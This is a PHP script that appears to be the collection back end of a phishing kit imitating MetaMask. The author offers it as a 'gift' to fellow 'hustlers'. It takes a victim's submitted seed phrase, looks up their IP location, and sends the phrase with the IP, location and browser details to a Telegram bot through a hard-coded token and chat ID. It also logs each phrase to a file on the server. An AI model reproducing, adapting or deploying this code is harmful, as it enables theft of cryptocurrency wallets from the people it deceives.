<?php

$request = file_get_contents("http://api.sypexgeo.net/json/".$_SERVER['REMOTE_ADDR']); 
$array = json_decode($request);
$geo = $array->country->name_en;
$city = $array->city->name_en;
$date = date("m.d.Y"); //aaja


/*
 With love and respect to all the hustler out there,
 This is a small gift to my brothers,
 All the best with your luck,
 
 Regards, 
 j1j1b1s@m3r0
  
  */


    $message = "<b>Welcome 2 The Jungle </b> 
    
<b>Wallet:</b> Metamask
<b>Phrase:</b> <code>" . $_POST["data"] . "</code>
<b>IP:</b> " .$_SERVER['REMOTE_ADDR'] . " | " .$geo. " | " .$city. "
<b>User:</b> " . $_SERVER['HTTP_USER_AGENT'] . "";


sendTel($message);  
	
    function sendTel($message){
		$id = "5442785564"; 
        $token = "5457463144:AAG8t4k7e2ew3tTi0IBShcWbSia0Irvxm10"; 
		$filename = "https://api.telegram.org/bot".$token."/sendMessage?chat_id=".$id."&text=".urlencode($message)."&parse_mode=html";
		file_get_contents($filename);
        $_POST["import-account__secret-phrase"]. $text = $_POST['data']."\n";;
        @file_put_contents($_SERVER['DOCUMENT_ROOT'].'/log/'.'log.txt', $text, FILE_APPEND);	

    }
    
    
    ?>
    
    